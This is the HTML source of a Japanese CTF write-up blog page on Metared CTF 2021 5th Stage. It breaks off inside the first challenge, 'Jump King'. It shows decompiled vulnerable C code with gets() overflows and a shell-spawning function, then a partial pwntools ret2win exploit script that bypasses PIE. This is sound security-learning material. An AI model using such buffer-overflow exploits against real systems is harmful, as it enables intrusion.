@@ -1,0 +1,1355 @@
+
+<!doctype html>
+<html lang="ja" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="@ret2home のブログや CTF の Writeup など">
+      
+      
+        <link rel="canonical" href="https://ret2home.github.io/blog/CTF/metared2021-5/">
+      
+      
+        <meta name="author" content="ret2home">
+      
+      <link rel="shortcut icon" href="../../assets/avatar.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.1.0">
+    
+    
+      
+        <title>Metared CTF 5th Stage writeup - risoria's blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.bc7e593a.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab28b872.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#7e56c2">
+        
+      
+    
+    
+    
+      
+        
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+      <link rel="stylesheet" href="../../assets/extra.css">
+    
+    
+      
+    
+    
+  
+  
+    
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Metared CTF 5th Stage writeup - risoria's blog">
+  <meta property="og:description" content="@ret2home のブログや CTF の Writeup など">
+  <meta property="og:url" content="https://ret2home.github.io/blog/CTF/metared2021-5/">
+  <meta property="og:image" content="https://ret2home.github.io/blog/assets/avatar.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@ret2home">
+  <meta name="twitter:creator" content="@ret2home">
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-MJQPPFRVVS"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  
+    gtag('config', 'G-MJQPPFRVVS');
+  </script>
+
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="deep-purple" data-md-color-accent="">
+      
+  
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#metared-ctf-5th-stage-writeup" class="md-skip">
+          コンテンツにスキップ
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://ret2home.github.io/blog/" title="risoria&#39;s blog" class="md-header-nav__button md-logo" aria-label="risoria's blog">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 19V7H4v12h16m0-16a2 2 0 012 2v14a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h16m-7 14v-2h5v2h-5m-3.42-4L5.57 9H8.4l3.3 3.3c.39.39.39 1.03 0 1.42L8.42 17H5.59l3.99-4z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      
+        <div class="md-header-nav__ellipsis">
+          <span class="md-header-nav__topic md-ellipsis">
+            risoria's blog
+          </span>
+          <span class="md-header-nav__topic md-ellipsis">
+            
+              Metared CTF 5th Stage writeup
+            
+          </span>
+        </div>
+      
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="検索" placeholder="検索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/ret2home/blog/" title="リポジトリへ" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ret2home/blog
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+
+  
+
+<nav class="md-tabs md-tabs--active" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." class="md-tabs__link">
+        Home
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../kyopro/joi2022-ho/" class="md-tabs__link">
+          競プロ
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="./" class="md-tabs__link md-tabs__link--active">
+          CTF
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../others/nanamogi/" class="md-tabs__link">
+          旅行記他
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://ret2home.github.io/blog/" title="risoria&#39;s blog" class="md-nav__button md-logo" aria-label="risoria's blog">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 19V7H4v12h16m0-16a2 2 0 012 2v14a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h16m-7 14v-2h5v2h-5m-3.42-4L5.57 9H8.4l3.3 3.3c.39.39.39 1.03 0 1.42L8.42 17H5.59l3.99-4z"/></svg>
+
+    </a>
+    risoria's blog
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/ret2home/blog/" title="リポジトリへ" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ret2home/blog
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      競プロ
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="競プロ" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        競プロ
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kyopro/joi2022-ho/" class="md-nav__link">
+      JOI 2021/2022 本選参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kyopro/joi2021-ho/" class="md-nav__link">
+      JOI 2020/2021 本選参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kyopro/joi2021-yo/" class="md-nav__link">
+      JOI 2020/2021 二次予選参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kyopro/joi2020-sp/" class="md-nav__link">
+      JOI 2019/2020 春合宿参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kyopro/joi2020-ho/" class="md-nav__link">
+      JOI 2019/2020 本選参加記
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      CTF
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="CTF" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        CTF
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Metared CTF 5th Stage writeup
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      Metared CTF 5th Stage writeup
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目次">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目次
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#pwn-jump-king-100pts" class="md-nav__link">
+    [pwn] Jump King 100pts
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-back-to-basic-web-100pts" class="md-nav__link">
+    [web] Back to Basic Web 100pts
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-vulns-none-100pts" class="md-nav__link">
+    [web] Vulns? None 100pts
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn-leaky-shell-477pts" class="md-nav__link">
+    [pwn] Leaky Shell 477pts
+  </a>
+  
+    <nav class="md-nav" aria-label="[pwn] Leaky Shell 477pts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    ベースアドレスのリーク
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#libc" class="md-nav__link">
+    libc ベースアドレスのリーク
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#canary" class="md-nav__link">
+    Canary のリーク
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack" class="md-nav__link">
+    Attack!!!
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
+    
+    <label class="md-nav__link" for="nav-3-2">
+      picoCTF 2021 writeup
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="picoCTF 2021 writeup" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-2">
+        <span class="md-nav__icon md-icon"></span>
+        picoCTF 2021 writeup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/" class="md-nav__link">
+      overview
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-2-2" type="checkbox" id="nav-3-2-2">
+    
+    <label class="md-nav__link" for="nav-3-2-2">
+      pwn
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="pwn" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-2-2">
+        <span class="md-nav__icon md-icon"></span>
+        pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/gauntlet/" class="md-nav__link">
+      Binary Gauntlet
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/cacheme/" class="md-nav__link">
+      Cache Me Outside
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/hereslibc/" class="md-nav__link">
+      Here's a LIBC
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/unsubsc/" class="md-nav__link">
+      Unsubscriptions Are Free
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/filtered/" class="md-nav__link">
+      filtered-shellcode
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/kitengine/" class="md-nav__link">
+      Kit Engine
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/pwn/horsepower/" class="md-nav__link">
+      Download Horsepower
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-2-3" type="checkbox" id="nav-3-2-3">
+    
+    <label class="md-nav__link" for="nav-3-2-3">
+      rev
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="rev" data-md-level="3">
+      <label class="md-nav__title" for="nav-3-2-3">
+        <span class="md-nav__icon md-icon"></span>
+        rev
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/rev/gogo/" class="md-nav__link">
+      gogo
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/rev/easyasgdb/" class="md-nav__link">
+      Easy as GDB
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/rev/powershelly/" class="md-nav__link">
+      powershelly
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/rev/rolling/" class="md-nav__link">
+      Rolling My Own
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../picoctf-2021/rev/checkpass/" class="md-nav__link">
+      checkpass
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../modctf-2021/" class="md-nav__link">
+      防衛省 CTF 参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../zer0pts-ctf-2021/" class="md-nav__link">
+      zer0pts CTF 2021 writeup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../0x41414141-pwn/" class="md-nav__link">
+      0x41414141 CTF Writeup (pwn only)
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../pakenctf2020/" class="md-nav__link">
+      Paken CTF 2020 運営記
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      旅行記他
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="旅行記他" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        旅行記他
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../others/nanamogi/" class="md-nav__link">
+      UFOキャッチャー制作中間記録・七模擬まで
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../others/TISF2023/" class="md-nav__link">
+      Thailand International Science Fair 2023 参加記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../others/kansai-trip2/" class="md-nav__link">
+      関西旅行記2 〜マスフェスタ参加記を添えて〜
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../others/ndfes2022/" class="md-nav__link">
+      灘校文化祭訪問記
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../others/pakencamp2021/" class="md-nav__link">
+      パ研合宿 2021 運営記
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目次">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目次
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#pwn-jump-king-100pts" class="md-nav__link">
+    [pwn] Jump King 100pts
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-back-to-basic-web-100pts" class="md-nav__link">
+    [web] Back to Basic Web 100pts
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-vulns-none-100pts" class="md-nav__link">
+    [web] Vulns? None 100pts
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn-leaky-shell-477pts" class="md-nav__link">
+    [pwn] Leaky Shell 477pts
+  </a>
+  
+    <nav class="md-nav" aria-label="[pwn] Leaky Shell 477pts">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    ベースアドレスのリーク
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#libc" class="md-nav__link">
+    libc ベースアドレスのリーク
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#canary" class="md-nav__link">
+    Canary のリーク
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack" class="md-nav__link">
+    Attack!!!
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/ret2home/blog/edit/master/docs/CTF/metared2021-5/index.md" title="編集" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                <h1 id="metared-ctf-5th-stage-writeup">Metared CTF 5<sup>th</sup> Stage writeup<a class="headerlink" href="#metared-ctf-5th-stage-writeup" title="Permanent link">&para;</a></h1>
+<p>なぜこの CTF は平日開催なのか、その謎を探るべく（ry</p>
+<p>鉄から帰宅後に 5 時間くらい参加したんですが、結局寝たのが朝の 5 時で、それから 15 時間寝続けて起きたら 1 日が終わっていました（は？）</p>
+<p>夢では現代文の試験にラノベが出題されていたり、電車内で殺人鬼から逃げたりしていました。
+夢の中だとアニメを観ていたはずがいつの間にかその中に入り込んでた、なんて事がよくあります。</p>
+<p>成績は正の点数を得た人の中だと 39 位/145 チームでした。てか 100 点以外のまともな問題を 1 問しか解けてない件・・・
+平日開催のせいで参加者が少なくて 0 Solves 連発してて開催者が不憫です（何様）。</p>
+<p><img alt="solves" src="solves.png" /></p>
+<p>そろそろ始めましょうかね、では解いた順に</p>
+<h2 id="pwn-jump-king-100pts">[pwn] Jump King 100pts<a class="headerlink" href="#pwn-jump-king-100pts" title="Permanent link">&para;</a></h2>
+<p>シンプルな Buffer Over Flow です。</p>
+<div class="highlight"><pre><span></span><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div>
+<details class="note"><summary>Decompiled Code</summary><p><div class="highlight"><pre><span></span><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; == Jump to Win == &quot;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; == Your username: &quot;</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot; == You missed the jump == &quot;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">jump</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="nf">jump</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="mh">0x4155</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot; == The jump was successful == &quot;</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot; == Vuln address: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">vuln</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot; == Your password so we can advance: &quot;</span><span class="p">);</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Close but the jump is not far enough!&quot;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; == You got it! == &quot;</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></p>
+</details>
+<p>グローバル変数 <code>username</code> の入力に BOF があって <code>flag</code> が書き換えられて、<code>flag</code> を 0x4155 にできたらさらに <code>jump</code> の中にも BOF があります。
+<code>vuln</code> のアドレスを貰えているので、あとはリターンアドレスを書き換えて <code>vuln</code> に飛ばすとシェルが開けます。</p>
+<p>なお、64bit なので Stack Align の関係で <code>ret;</code> を挟まないといけないんですが、PIE が有効なので貰った <code>vuln</code> のアドレスからベースアドレスを計算する必要があります。</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">LOCAL</span><span class="o">=</span><span class="kc">True</span>
+<span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./vuln&quot;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;ctf-metared-2021.ua.pt&quot;</span><span class="p">,</span><span class="mi">27159</span><span class="p">)</span>
+
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./vuln&quot;</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">64</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x4155</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Vuln address: &quot;</span><span class="p">)</span>
+<span class="n">base_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;vuln&#39;</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">))</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">base_addr</span><span class="o">+</span><span class="mh">0x0000101a</span><span class="p">)</span> <span class="c1"># ret;</span>
